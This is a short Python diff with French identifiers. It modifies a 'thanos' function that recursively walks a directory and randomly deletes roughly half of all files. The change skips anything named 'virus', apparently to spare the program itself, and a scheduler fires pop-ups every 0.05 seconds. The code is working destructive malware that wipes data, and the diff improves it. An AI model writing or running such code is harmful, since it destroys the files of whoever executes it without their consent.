@@ -68,15 +68,16 @@ def sound():
 def thanos(dossier):
     for nom_fichier in os.listdir(dossier):
         chemin_fichier = os.path.join(dossier, nom_fichier)
-        if os.path.isdir(chemin_fichier):
-            thanos(chemin_fichier)
-        else:
-            delete = randomNumber(0, 1)
-            if(delete == 0):
-                print('delete')
-                os.remove(chemin_fichier)
+        if nom_fichier != 'virus':
+            if os.path.isdir(chemin_fichier):
+                thanos(chemin_fichier)
             else:
-                print('keep')
+                delete = randomNumber(0, 1)
+                if(delete == 0):
+                    print('delete')
+                    os.remove(chemin_fichier)
+                else:
+                    print('keep')
     
 
 schedule.every(0.05).seconds.do(popUps)
